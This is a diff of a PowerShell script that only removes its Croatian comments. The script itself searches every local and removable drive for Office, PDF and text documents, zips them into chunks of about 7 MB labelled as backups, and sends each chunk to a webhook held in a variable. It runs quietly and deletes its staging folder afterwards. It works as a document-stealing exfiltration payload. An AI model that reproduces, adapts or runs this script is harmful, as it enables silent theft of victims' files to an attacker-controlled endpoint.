@@ -1,28 +1,28 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-$WebhookUrl = $dc # Pretpostavljam da je $dc definirana varijabla s webhook URL-om
+$WebhookUrl = $dc 
 $MaxZipSize = 7MB
 $OutputPath = "$env:TEMP\BackupDocs"
 $Extensions = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.txt", "*.rtf")
 $ExcludedDirs = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
 
-# Provjera webhook URL-a
+
 if (-not $WebhookUrl) {
     Write-Output "Webhook URL nije definiran!" | Out-Null
     exit
 }
 
-# Kreiranje direktorija ako ne postoji
+
 if (-not (Test-Path $OutputPath)) {
     New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
 }
 
-# Pronalazak svih diskova
+
 $Drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2 OR DriveType=3" | Select-Object -ExpandProperty DeviceID
 $Files = @()
 
-# Prikupljanje datoteka
+
 foreach ($Drive in $Drives) {
     foreach ($Ext in $Extensions) {
         try {
@@ -40,7 +40,7 @@ $CurrentZipSize = 0
 $CurrentFiles = @()
 $ZipFiles = @()
 
-# Funkcija za kreiranje ZIP datoteke
+
 function Create-ZipFile {
     param($FileList, $ZipPath)
     if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue }
@@ -59,7 +59,7 @@ function Create-ZipFile {
     }
 }
 
-# Grupiranje datoteka u ZIP-ove
+
 foreach ($File in $Files) {
     $FileSize = $File.Length
     if ($CurrentZipSize + $FileSize -gt $MaxZipSize -and $CurrentFiles.Count -gt 0) {
@@ -74,14 +74,14 @@ foreach ($File in $Files) {
     $CurrentZipSize += $FileSize
 }
 
-# Kreiranje posljednje ZIP datoteke ako postoje preostale datoteke
+
 if ($CurrentFiles.Count -gt 0) {
     $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
     Create-ZipFile -FileList $CurrentFiles -ZipPath $ZipName
     $ZipFiles += $ZipName
 }
 
-# Slanje ZIP datoteka na webhook
+
 foreach ($ZipFile in $ZipFiles) {
     if (-not (Test-Path $ZipFile)) { continue }
     if ((Get-Item $ZipFile).Length -gt 8MB) { continue }
@@ -106,6 +106,6 @@ foreach ($ZipFile in $ZipFiles) {
     }
 }
 
-# Čišćenje i završetak
+
 Remove-Item -Path $OutputPath -Recurse -Force -ErrorAction SilentlyContinue
 exit
